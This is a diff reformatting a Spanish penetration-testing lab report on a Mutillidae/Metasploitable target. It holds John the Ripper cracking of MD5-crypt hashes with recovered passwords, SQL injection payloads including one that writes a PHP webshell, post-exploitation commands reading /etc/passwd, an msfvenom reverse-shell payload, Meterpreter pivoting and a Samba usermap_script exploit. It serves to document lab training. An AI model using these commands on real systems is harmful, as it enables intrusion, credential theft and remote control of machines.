@@ -1076,28 +1076,11 @@ Conclusión: Hashes MD5 Crypt ($1$)
 ![Averiguar tipo de hash](img/tipo-hash.jpg)
 
 ### 7.3 Cracking con John the Ripper
-bash# Desde Kali:
+
+Desde Kali:
+```
+bash# 
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
-```
-
-
-**Proceso:**
-```
-Using default input encoding: UTF-8
-Loaded 7 password hashes with 7 different salts (md5crypt [MD5 32/64])
-Cost 1 (iteration count) is 1000 for all loaded hashes
-Will run 4 OpenMP threads
-Press 'q' or Ctrl-C to abort, almost any other key for status
-
-123456789        (klog)
-batman           (sys)
-service          (service)
-
-3g 0:00:02:45 DONE (2026-01-09 14:15) 0.01818g/s 192384p/s 192384c/s 1345Kc/s
-Use the "--show" option to display all of the cracked passwords reliably
-Session completed
-Ver resultados:
-bashjohn --show hashes.txt
 ```
 
 **Resultado:**
@@ -1107,22 +1090,38 @@ sys:batman
 service:service
 
 3 password hashes cracked, 4 left
-
+```
 
 ![Resultados de John the Ripper](img/john-ripper.jpg)
 
-7.4 Resumen de Credenciales Crackeadas
-UsuarioHash (MD5 Crypt)ContraseñaEstadoklog$1$f2ZVMS4K$R9XkI.Cm...123456789✅ Crackeadosys$1$fUX6BPOt$Miyc3Up...batman✅ Crackeadoservice$1$kR3ue7JZ$7GxELD...service✅ Crackeadoroot$1$/avpfBJ1$x0z8w5U...-❌ No crackeadomsfadmin$1$XN10Zj2c$Rt/zzC...-❌ No crackeadouser$1$HESu9xrH$k.o3G93...-❌ No crackeadopostgres$1$Rw35ik.x$MgQgZU...-❌ No crackeado
+### 7.4 Resumen de Credenciales Crackeadas
 
-8. Resumen de Comandos Utilizados
+| Usuario     | Hash (MD5 Crypt)                | Contraseña   | Estado           |
+|-------------|----------------------------------|--------------|------------------|
+| klog        | $1$f2ZVMS4K$R9XkI.Cm...           | 123456789    | ✅ Crackeado     |
+| sys         | $1$fUX6BPOt$Miyc3Up...            | batman       | ✅ Crackeado     |
+| service     | $1$kR3ue7JZ$7GxELD...             | service      | ✅ Crackeado     |
+| root        | $1$/avpfBJ1$x0z8w5U...            | -            | ❌ No crackeado |
+| msfadmin    | $1$XN10Zj2c$Rt/zzC...             | -            | ❌ No crackeado |
+| user        | $1$HESu9xrH$k.o3G93...            | -            | ❌ No crackeado |
+| postgres    | $1$Rw35ik.x$MgQgZU...             | -            | ❌ No crackeado |
+
+
+### 8. Resumen de Comandos Utilizados
+
 Reconocimiento
+```
 bash# Burp Suite
 burpsuite &
 
 # Skipfish
 skipfish -YO -o ~/Desktop/skipfish_resultados http://192.168.0.21/mutillidae/index.php
+```
+
 SQL Injection
-sql-- Extracción de usuarios
+```
+sql
+-- Extracción de usuarios
 ' OR 1=1-- 
 
 -- Bypass autenticación
@@ -1145,14 +1144,21 @@ sql-- Extracción de usuarios
 
 -- Upload webshell
 ' UNION SELECT null,null,null,null,null,null,'[CÓDIGO PHP]' INTO DUMPFILE '/var/www/html/mutillidae/backdoor.php'--
+```
+
 Webshell Commands
-bashwhoami
+```
+bash
+whoami
 ls -la
 cat /etc/passwd
 ip addr show
 ping -c 1 192.168.8.133
+```
 Metasploit - Meterpreter
-bash# Generar payload
+```
+bash
+# Generar payload
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.30 LPORT=4444 -f elf > shell.elf
 
 # Server payload
@@ -1169,8 +1175,12 @@ exploit
 run autoroute -s 192.168.8.0/24
 run autoroute -p
 background
+```
+
 Metasploit - Samba Exploit
-bash# Escaneo de puertos
+```
+bash
+# Escaneo de puertos
 use auxiliary/scanner/portscan/tcp
 set RHOSTS 192.168.8.133
 set PORTS 1-10000
@@ -1181,15 +1191,21 @@ use exploit/multi/samba/usermap_script
 set RHOSTS 192.168.8.133
 set PAYLOAD cmd/unix/bind_perl
 exploit
+```
+
 Password Cracking
-bash# Identificar hash
+```
+bash
+# Identificar hash
 hashid '$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.'
+
 
 # Crackear con John
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 
 # Ver resultados
 john --show hashes.txt
+```
 
 ## 9. Herramientas y Versiones
 | Herramienta              | Versión | Propósito                          |
